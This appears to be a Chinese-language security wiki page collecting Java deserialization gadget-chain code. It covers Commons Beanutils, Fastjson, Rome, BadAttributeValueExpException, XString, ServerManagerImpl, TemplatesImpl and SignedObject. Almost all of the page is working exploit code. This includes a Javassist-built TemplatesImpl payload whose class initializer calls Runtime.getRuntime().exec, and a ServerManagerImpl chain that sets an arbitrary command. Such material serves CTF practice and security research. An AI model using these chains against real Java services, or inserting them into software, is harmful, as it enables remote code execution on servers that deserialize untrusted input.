# Java 反序列化 Gadget


### deserialize2Getter

??? info "Commons Beanutils (from [Eki-marshalexp](https://github.com/EkiXu/marshalexp))"
    ```java
    public static PriorityQueue deserialize2Getter(Object obj,String getterName) throws Exception{
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        ReflectUtils.setFieldValue(comparator, "property", getterName);

        // switch contents of queue
        final Object[] queueArray = (Object[]) ReflectUtils.getFieldValue(queue, "queue");
        queueArray[0] = obj;
        queueArray[1] = obj;
        return queue;
    }
    ```

### toString2Getter

??? info "Fastjson (from [Eki-marshalexp](https://github.com/EkiXu/marshalexp))"
    ```java
    public static JSONObject toString2Getter(Object obj){
        JSONObject gadget = new JSONObject();
        gadget.put("eki",obj);
        return gadget;
    }
    ```

??? info "rome/rometools (from [Eki-marshalexp](https://github.com/EkiXu/marshalexp))"
    ```java
    public static ObjectBean toString2Getter(Class<?> clz, Object o){
    //        ToStringBean tb = new ToStringBean(clz, o);
    //        EqualsBean eb = new EqualsBean(ToStringBean.class, tb);
        ObjectBean tb = new ObjectBean(clz,o);
        ObjectBean eb = new ObjectBean(ObjectBean.class,tb);
        return eb;
    }
    ```

### deserialize2ToString
??? info "BadAttributeValueExpException (from [Eki-marshalexp](https://github.com/EkiXu/marshalexp))"
    ```java
    public static BadAttributeValueExpException deserialize2ToString(Object poc) throws Exception {
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        ReflectUtils.setFieldValue(badAttributeValueExpException,"val",poc);
        return badAttributeValueExpException;
    }
    ```

??? info "XString (from [Eki-marshalexp](https://github.com/EkiXu/marshalexp))"
    准确来说是 `hashCode2ToString`。
    ```java
    public static HashMap deserialize2ToString(Object obj) throws Exception{
        XString xString = new XString("Eki");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",obj);
        map1.put("zZ",xString);

        map2.put("yy",xString);
        map2.put("zZ",obj);

        HashMap gadget = GHashMap.deserialize2HashCode(map1,map2);
        return gadget;
    }
    ```


### getter2RCE
??? info "JDK - ServerManagerImpl  (from [Eki-marshalexp](https://github.com/EkiXu/marshalexp))"
    ```java
    public static ServerManagerImpl getter2RCE(String cmd) throws Exception {
        ServerTableEntry entry = (ServerTableEntry) ReflectUtils.forceNewInstance(ServerTableEntry.class);
        ReflectUtils.setFieldValue(entry,"activationCmd",cmd);
        ReflectUtils.setFieldValue(entry,"state",2);
        ReflectUtils.setFieldValue(entry, "process", new Process() {
            @Override
            public OutputStream getOutputStream() {
                return null;
            }

            @Override
            public InputStream getInputStream() {
                return null;
            }

            @Override
            public InputStream getErrorStream() {
                return null;
            }

            @Override
            public int waitFor() throws InterruptedException {
                return 0;
            }

            @Override
            public int exitValue() {
                return 0;
            }

            @Override
            public void destroy() {

            }
        });
        ServerManagerImpl obj = (ServerManagerImpl) ReflectUtils.forceNewInstance(ServerManagerImpl.class);
        HashMap serverTable = new HashMap<>(256);
        serverTable.put(1,entry);
        ReflectUtils.setFieldValue(obj,"serverTable",serverTable);
        return obj;
    }
    ```
??? info "JDK - TemplatesImpl (from [Bridge-wiki](https://github.com/KingBridgeSS/wiki))"
    ```java
    TemplatesImpl templates = new TemplatesImpl();
    ClassPool classPool = ClassPool.getDefault();
    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    CtClass ctClass = classPool.makeClass("Evil");
    ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
    String shell = "java.lang.Runtime.getRuntime().exec(\"calc\");";
    ctClass.makeClassInitializer().insertBefore(shell);

    byte[] shellCode = ctClass.toBytecode();
    byte[][] targetByteCode = new byte[][]{shellCode};

    Class c1 = templates.getClass();
    Field _name = c1.getDeclaredField("_name");
    Field _bytecode = c1.getDeclaredField("_bytecodes");
    Field _tfactory = c1.getDeclaredField("_tfactory");
    _name.setAccessible(true);
    _bytecode.setAccessible(true);
    _tfactory.setAccessible(true);
    _name.set(templates, "");
    _bytecode.set(templates, targetByteCode);
    _tfactory.set(templates, new TransformerFactoryImpl());
    ```

??? info "UnixPrintServiceLookup"
    仅在 Linux 环境低jdk版本下有

### getter2Deserialize
??? info "JDK - SignedObject (from [Eki-marshalexp](https://github.com/EkiXu/marshalexp))"
    ```java
    public static java.security.SignedObject getter2Deserialize(Object poc) throws Exception{

    //Create a key
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DSA", "SUN");
        SecureRandom random = SecureRandom.getInstance("SHA1PRNG", "SUN");
        keyGen.initialize(1024, random);
    // create a private key
        PrivateKey signingKey = keyGen.generateKeyPair().getPrivate();
    // create a Signature
        Signature signingEngine = Signature.getInstance("DSA");
        signingEngine.initSign(signingKey);
    // sign our object
        SignedObject so = new SignedObject((Serializable) poc, signingKey, signingEngine);
        return so;
    }
    ```